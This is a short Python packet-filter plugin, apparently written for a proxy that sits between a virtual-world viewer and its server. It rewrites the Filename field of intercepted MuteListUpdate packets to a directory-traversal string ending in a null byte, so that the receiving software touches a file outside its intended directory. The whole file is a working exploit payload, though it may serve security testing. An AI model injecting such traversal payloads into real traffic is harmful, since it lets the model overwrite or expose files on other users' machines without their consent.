from PacketFilterBase import *

class TestFilter(PacketFilterBase):
    
    def MuteListUpdate(self, fromViewer, packet):
        data = packet.getDecodedData()
        data['MuteListUpdate']['MuteData']['Filename'] = \
            '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\test.tmp\x00'
        packet.setDecodedData(data)
        return False, packet
